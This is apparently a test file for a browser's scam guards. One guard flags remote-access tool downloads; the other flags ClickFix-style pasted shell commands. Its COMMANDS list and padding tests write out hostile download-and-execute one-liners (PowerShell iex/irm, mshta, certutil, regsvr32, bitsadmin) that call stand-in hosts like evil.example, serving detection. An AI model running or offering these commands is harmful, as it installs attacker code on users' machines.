#!/usr/bin/env python3
"""Tests for the two scam guards' matchers.

The remote access guard decides from a download's file name and host
(components/boring/guards/remote_access_tools.cc). The ClickFix guard
decides from the text a page copies (components/boring/guards/
shell_command.cc). Both are plain standard C++, so this compiles the real
files, not a copy, into a small program with the Visual Studio compiler
and asks it a table of questions. No Chromium tree and no browser.

Two kinds of case matter equally. The positives are what scammers send.
The negatives are what people copy and download every day, and a guard
that cries wolf on them gets turned off, so they are as much of the
contract as the positives.

Usage: python -m pytest boring-core/tools/tests/test_scam_guards.py
"""

import os
import shutil
import subprocess
import tempfile
import unittest

TESTS = os.path.dirname(os.path.abspath(__file__))
CORE = os.path.dirname(os.path.dirname(TESTS))
GUARDS = os.path.join(CORE, "components", "boring", "guards")
VCVARS = (
    r"C:\Program Files\Microsoft Visual Studio\2022\Community"
    r"\VC\Auxiliary\Build\vcvars64.bat"
)

# (file name, host) -> the tool that should be named.
TOOL_HITS = [
    # Pass 2, T3: other program types, no ending, look-alike letters.
    ("AnyDesk.scr", "", "AnyDesk"),
    ("AnyDesk.com", "", "AnyDesk"),
    ("AnyDesk.iso", "", "AnyDesk"),
    ("AnyDesk.bat", "", "AnyDesk"),
    ("AnyDesk", "", "AnyDesk"),
    ("\u0410nyDesk.exe", "", "AnyDesk"),
    ("TeamV\u0456ewer_Setup.exe", "", "TeamViewer"),
    ("\uff21ny\uff24esk.exe", "", "AnyDesk"),
    ("AnyDesk.exe", "", "AnyDesk"),
    ("AnyDesk (1).exe", "", "AnyDesk"),
    ("ANYDESK.EXE", "", "AnyDesk"),
    ("anydesk.dmg", "", "AnyDesk"),
    ("Any Desk.exe", "", "AnyDesk"),
    ("TeamViewer_Setup.exe", "", "TeamViewer"),
    ("TeamViewer_Setup_x64.exe", "download.teamviewer.com", "TeamViewer"),
    ("TeamViewerQS_en-idc8mzz4kn.exe", "", "TeamViewer"),
    ("TeamViewer.zip", "", "TeamViewer"),
    ("Quick Assist.msixbundle", "", "Quick Assist"),
    ("MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe.msixbundle", "", "Quick Assist"),
    ("quick_assist_setup.exe", "", "Quick Assist"),
    ("UltraViewer_setup_6.6_en.exe", "", "UltraViewer"),
    ("rustdesk-1.2.3-x86_64.exe", "", "RustDesk"),
    ("rustdesk-1.2.3.msi", "github.com", "RustDesk"),
    ("ScreenConnect.ClientSetup.exe", "", "ScreenConnect"),
    ("ScreenConnect.WindowsClient.msi", "", "ScreenConnect"),
    ("ConnectWiseControl.ClientSetup.exe", "", "ConnectWise"),
    ("LogMeIn.msi", "", "LogMeIn"),
    ("LogMeInRescue-Applet.exe", "", "LogMeIn"),
    ("Splashtop_Streamer_Windows_v3.6.exe", "", "Splashtop"),
    ("ZohoAssist.exe", "", "Zoho Assist"),
    ("Zoho Assist Setup.exe", "", "Zoho Assist"),
    ("SupremoSetup.exe", "", "Supremo"),
    ("Supremo.exe", "", "Supremo"),
    ("AeroAdmin.exe", "", "AeroAdmin"),
    ("AMMYY_Admin.exe", "", "Ammyy"),
    ("ammyy.zip", "", "Ammyy"),
    # The name says nothing, the vendor's own server says it all.
    ("setup.exe", "download.anydesk.com", "AnyDesk"),
    ("setup.exe", "anydesk.com", "AnyDesk"),
    ("client.msi", "relay.screenconnect.com", "ScreenConnect"),
    ("a.exe", "dl.teamviewer.com", "TeamViewer"),
    ("app.dmg", "DOWNLOAD.RUSTDESK.COM", "RustDesk"),
    ("run.exe", "assist.zoho.com", "Zoho Assist"),
    ("chromeremotedesktophost.msi", "", "Chrome Remote Desktop"),
    ("AteraAgentSetup.exe", "", "Atera"),
    ("SimpleHelp-Remote-Access.exe", "", "SimpleHelp"),
    ("HopToDesk.exe", "", "HopToDesk"),
    # ToDesk is found by its host alone: the word sits inside others.
    ("setup.exe", "dl.todesk.com", "ToDesk"),
    # A full path is still a file name.
    (r"C:\Users\me\Downloads\AnyDesk.exe", "", "AnyDesk"),
]

TOOL_MISSES = [
    ("notes", ""),
    ("report.docx", "anydesk.com"),
    ("report.pdf", "anydesk.com"),
    ("anydesk-guide.pdf", ""),
    ("teamviewer notes.txt", ""),
    ("supremo.pdf", ""),
    ("notes", "anydesk.com"),
    ("chrome_installer.exe", "dl.google.com"),
    ("firefox-setup.exe", "download.mozilla.org"),
    ("setup.exe", "example.com"),
    ("setup.exe", ""),
    ("desk.exe", ""),
    ("viewer.exe", ""),
    ("team.exe", ""),
    ("remote.exe", ""),
    ("any_desktop_wallpaper.jpg", ""),
    ("photodesk.exe", ""),
    ("ToDesk_setup.pdf", "todesk.com"),
    ("instal-todesk.exe", ""),
    ("photo.png", "teamviewer.com"),
    # Lookalike hosts are not the vendor.
    ("setup.exe", "anydesk.com.evil.example"),
    ("setup.exe", "notanydesk.com"),
    # An archive is not enough on the host alone.
    ("files.zip", "download.anydesk.com"),
    ("", ""),
]

# Text a page copies that is a command to run.
COMMANDS = [
    'powershell -w hidden -c "iex (irm https://evil.example/a.ps1)"',
    'cmd /c start /min powershell -nop -w hidden -c "iwr http://1.2.3.4/x|iex"',
    "POWERSHELL -NoP -W Hidden -C \"IEX((New-Object Net.WebClient).DownloadString('http://x.example/a'))\"",
    "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
    "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -f x.ps1",
    "pwsh -c \"irm https://evil.example | iex\"",
    "mshta https://evil.example/captcha.hta",
    'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd /c x"":close")',
    "mshta.exe http://1.2.3.4/a",
    "cmd /c ping 127.0.0.1",
    "cmd.exe /k whoami",
    "cmd /v:on /c echo hi",
    "curl https://evil.example/a | iex",
    "curl.exe -s http://1.2.3.4/a | powershell -",
    "wget https://evil.example/a.ps1 | cmd",
    "irm https://evil.example | iex",
    "iwr https://evil.example/a.ps1 -UseBasicParsing | iex",
    "iex (New-Object Net.WebClient).DownloadString('http://evil.example/a')",
    "Invoke-Expression (Invoke-WebRequest https://evil.example/a)",
    "certutil -urlcache -f http://evil.example/a.exe %temp%\\a.exe",
    "msiexec /i https://evil.example/a.msi /qn",
    "regsvr32 /s /n /u /i:http://evil.example/a.sct scrobj.dll",
    'rundll32 javascript:"\\..\\mshtml,RunHTMLApplication ";document.write()',
    "bitsadmin /transfer j https://evil.example/a.exe %temp%\\a.exe",
    "wscript //e:jscript http://evil.example/a.js",
    "conhost --headless powershell -c whoami",
    # The fake captcha dressing around the real command.
    "cmd /c start /min powershell -w h -c \"iex(irm https://evil.example)\" "
    "# I am not a robot - reCAPTCHA Verification ID: 6283",
    # The command on the second line, after padding.
    "\n\n   Verification ID: 1234\ncmd /c mshta https://evil.example/a\n",
]

# What people copy every day. None of these may trigger.
NORMAL = [
    "Hello world",
    "See you at 5pm, bring the report",
    "https://example.com/some/page?id=3&x=4",
    "https://github.com/PowerShell/PowerShell/releases",
    "jane.doe@example.com",
    "Tr0ub4dor&3 and a passphrase",
    "1-800-555-0199",
    "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq",
    '{"name": "boring", "version": "3.0.0", "private": true}',
    "const answer = await fetch(url).then((r) => r.json());",
    'console.log("run curl or powershell later");',
    "SELECT name, email FROM users WHERE id = 3;",
    "git clone https://github.com/JD-D3V/boring-web-browser.git",
    "npm install --save-dev typescript",
    "pip install requests",
    "python manage.py runserver 0.0.0.0:8000",
    "ls -la /var/log",
    "dir /s /b C:\\Users",
    "ipconfig /all",
    "ping google.com",
    "cd /d C:\\Windows\\System32",
    "echo %PATH%",
    "curl https://example.com/api/items -H 'Accept: application/json'",
    "curl -o file.zip https://example.com/file.zip",
    "curl -s https://api.example.com/items | jq .",
    "curl -s https://api.example.com/items | python -m json.tool",
    "wget https://example.com/a.tar.gz",
    "wget -qO- https://example.com/a.tar.gz | tar xz",
    "curl -fsSL https://example.com/key.gpg | sudo tee /usr/share/keyrings/x.gpg",
    "curl -fsSL https://example.com/key.gpg | sudo gpg --dearmor -o /usr/share/keyrings/x.gpg",
    "docker run -it ubuntu bash",
    # Unix installers are not what a Windows run box takes.
    "curl -fsSL https://get.docker.com | sh",
    "curl -s https://example.com/install.sh | sudo bash -s -- -y",
    '/bin/bash -c "$(curl -fsSL https://raw.example/install.sh)"',
    "wget -qO- https://example.com/setup | sh",
    "echo SGVsbG8gd29ybGQ= | base64 -d | bash",
    "npm install -g typescript && npx tsc --init",
    "winget install --id Git.Git -e --source winget",
    "choco install nodejs -y",
    "py -m pip install --upgrade pip",
    "Set-ExecutionPolicy RemoteSigned",
    "Get-ChildItem -Recurse | Where-Object { $_.Length -gt 1MB }",
    "Invoke-WebRequest is how PowerShell downloads a page.",
    "ps aux | grep powershell",
    "cat notes.txt | sh",
    "Press Cmd+C to copy and Cmd+V to paste",
    "Open the command prompt (cmd) as an administrator, then reboot.",
    "PowerShell is a task automation framework from Microsoft.",
    "Download PowerShell 7 from https://aka.ms/powershell and install it.",
    "Open PowerShell. Then run curl https://example.com on its own line.",
    "Shares of IEX (Investors Exchange) rose 3 percent on Tuesday.",
    "iexplore.exe is the old browser",
    "Microsoft.PowerShell.Utility is a module",
    "echo hello | base64",
    "base64 -d notes.b64 > notes.txt",
    "The mshta is a Windows component",
    "a",
    "",
    "x" * 200000,
]


def hexed(text):
    return text.encode("utf-8").hex()


class GuardMatchers(unittest.TestCase):
    exe = None
    workdir = None

    @classmethod
    def setUpClass(cls):
        if not os.path.exists(VCVARS):
            raise unittest.SkipTest("Visual Studio 2022 is not installed here")
        cls.workdir = tempfile.mkdtemp(prefix="guards-", dir=os.environ.get("TMP"))
        exe = os.path.join(cls.workdir, "guard_probe.exe")
        bat = os.path.join(cls.workdir, "build.bat")
        with open(bat, "w") as f:
            f.write(
                "@echo off\n"
                f'call "{VCVARS}" >nul\n'
                f'cd /d "{cls.workdir}"\n'
                "cl /nologo /EHsc /std:c++20 /W3 /O1 "
                f'/I "{CORE}" /Fe"{exe}" '
                f'"{os.path.join(TESTS, "guard_probe.cc")}" '
                f'"{os.path.join(GUARDS, "remote_access_tools.cc")}" '
                f'"{os.path.join(GUARDS, "shell_command.cc")}"\n'
            )
        done = subprocess.run(
            ["cmd", "/c", bat], capture_output=True, text=True, timeout=300
        )
        if done.returncode != 0 or not os.path.exists(exe):
            raise AssertionError("probe did not compile:\n" + done.stdout + done.stderr)
        cls.exe = exe

    @classmethod
    def tearDownClass(cls):
        if cls.workdir:
            shutil.rmtree(cls.workdir, ignore_errors=True)

    def ask(self, lines):
        """One answer per request line."""
        done = subprocess.run(
            [self.exe],
            input="\n".join(lines) + "\n",
            capture_output=True,
            text=True,
            timeout=60,
        )
        self.assertEqual(done.returncode, 0, done.stderr)
        answers = done.stdout.split("\n")[:-1]
        self.assertEqual(len(answers), len(lines), answers)
        return answers

    def test_remote_access_tools_are_named(self):
        answers = self.ask(
            [f"tool\t{hexed(name)}\t{hexed(host)}" for name, host, _ in TOOL_HITS]
        )
        for (name, host, want), got in zip(TOOL_HITS, answers, strict=True):
            with self.subTest(name=name, host=host):
                self.assertEqual(got.strip(), want)

    def test_ordinary_downloads_are_left_alone(self):
        answers = self.ask(
            [f"tool\t{hexed(name)}\t{hexed(host)}" for name, host in TOOL_MISSES]
        )
        for (name, host), got in zip(TOOL_MISSES, answers, strict=True):
            with self.subTest(name=name, host=host):
                self.assertEqual(got.strip(), "")

    def test_shell_commands_are_found(self):
        answers = self.ask([f"cmd\t{hexed(text)}" for text in COMMANDS])
        for text, got in zip(COMMANDS, answers, strict=True):
            with self.subTest(text=text[:70]):
                self.assertEqual(got.strip(), "1")

    def test_padding_does_not_hide_a_command(self):
        """Item 63. More than 64 KB of blank space or filler around a
        command still leaves the command at one end."""
        cmd = 'powershell -w hidden -c "iwr http://evil.example/a | iex"'
        big = 70 * 1024
        padded = [
            " " * big + cmd,
            cmd + "\n" * big,
            "\n" * big + cmd + " " * big,
            "# filler\n" * (big // 9) + cmd,
            cmd + "\n" + "# filler\n" * (big // 9),
        ]
        answers = self.ask([f"cmd\t{hexed(text)}" for text in padded])
        for i, got in enumerate(answers):
            with self.subTest(case=i):
                self.assertEqual(got.strip(), "1")

    def test_padding_on_both_sides_does_not_hide_a_command(self):
        """Pass 2, S5. A command in the middle of long text is found."""
        cmd = 'powershell -w hidden -c "iwr http://evil.example/a | iex"'
        filler = "# filler\n" * (40 * 1024 // 9)
        nbsp = "\u00a0" * (40 * 1024)
        padded = [
            filler + cmd + "\n" + filler,
            "<# " + "x" * 40000 + " #> " + cmd + " <# " + "x" * 40000 + " #>",
            nbsp + cmd + nbsp,
            filler * 10 + cmd + filler * 10,
        ]
        answers = self.ask([f"cmd\t{hexed(text)}" for text in padded])
        for i, got in enumerate(answers):
            with self.subTest(case=i):
                self.assertEqual(got.strip(), "1")

    def test_long_ordinary_text_is_still_left_alone(self):
        article = "Some ordinary sentence about the weather today.\n" * 3000
        blanks = " " * (80 * 1024)
        answers = self.ask([f"cmd\t{hexed(text)}" for text in (article, blanks)])
        self.assertEqual([a.strip() for a in answers], ["0", "0"])

    def test_normal_copies_do_not_trigger(self):
        answers = self.ask([f"cmd\t{hexed(text)}" for text in NORMAL])
        for text, got in zip(NORMAL, answers, strict=True):
            with self.subTest(text=text[:70]):
                self.assertEqual(got.strip(), "0")

    def test_the_trade_off_is_what_the_header_says(self):
        """Windows installer one-liners trigger. Documented, not a bug."""
        for text in (
            "irm get.scoop.sh | iex",
            "iwr -useb https://deno.land/install.ps1 | iex",
            "powershell -c \"irm https://bun.sh/install.ps1|iex\"",
        ):
            with self.subTest(text=text):
                self.assertEqual(self.ask([f"cmd\t{hexed(text)}"])[0].strip(), "1")

    def test_report_the_false_positive_count(self):
        """Prints how the matcher did, so a run shows the numbers."""
        found = sum(
            a.strip() == "1"
            for a in self.ask([f"cmd\t{hexed(t)}" for t in COMMANDS])
        )
        wrong = [
            t[:60]
            for t, a in zip(
                NORMAL, self.ask([f"cmd\t{hexed(t)}" for t in NORMAL]), strict=True
            )
            if a.strip() == "1"
        ]
        wrong_names = [
            n
            for (n, h), a in zip(
                TOOL_MISSES,
                self.ask([f"tool\t{hexed(n)}\t{hexed(h)}" for n, h in TOOL_MISSES]),
                strict=True,
            )
            if a.strip()
        ]
        print(
            f"\nscam guards: commands caught {found}/{len(COMMANDS)}, "
            f"normal copies {len(NORMAL)} with {len(wrong)} false positives; "
            f"ordinary downloads {len(TOOL_MISSES)} with {len(wrong_names)} "
            "false positives"
        )
        self.assertEqual(found, len(COMMANDS))
        self.assertEqual(wrong, [])
        self.assertEqual(wrong_names, [])


def text_of(*parts):
    with open(os.path.join(CORE, *parts), encoding="utf-8") as f:
        return f.read()


class GuardWiring(unittest.TestCase):
    """The guards are hooked in, switched by one pref, and shown on Protection."""

    def test_patches_are_in_the_series(self):
        series = text_of("patches", "series").split()
        for name in ("scam-guards-clipboard.patch", "scam-guards-download.patch"):
            self.assertIn(name, series)
            self.assertTrue(os.path.exists(os.path.join(CORE, "patches", name)))

    def test_one_pref_on_by_default(self):
        self.assertIn(
            '"boring.protection.warn_scam_tricks"',
            text_of("components", "boring", "core", "boring_prefs.h"),
        )
        self.assertIn(
            "RegisterBooleanPref(prefs::kWarnScamTricks, true)",
            text_of("components", "boring", "core", "boring_prefs.cc"),
        )

    def test_both_guards_read_the_switch(self):
        policy = text_of("components", "boring", "guards", "guards_policy.cc")
        self.assertIn("prefs::kWarnScamTricks", policy)
        for name in ("clipboard_guard.cc", "download_guard.cc"):
            self.assertIn("IsEnabled(", text_of("components", "boring", "guards", name))

    def test_protection_page_has_the_row(self):
        page = text_of("components", "boring", "protection", "protection_ui.cc")
        self.assertIn('for="warn-scam-tricks"', page)
        self.assertIn("<strong>Warn about scam tricks</strong>", page)
        self.assertIn("kWarnScamTricks", page)

    def test_wording_has_no_em_dash(self):
        for name in (
            "clipboard_guard.cc",
            "download_guard.cc",
            "guard_infobar.cc",
            "remote_access_tools.inc",
        ):
            self.assertNotIn(chr(0x2014), text_of("components", "boring", "guards", name))


if __name__ == "__main__":
    unittest.main()
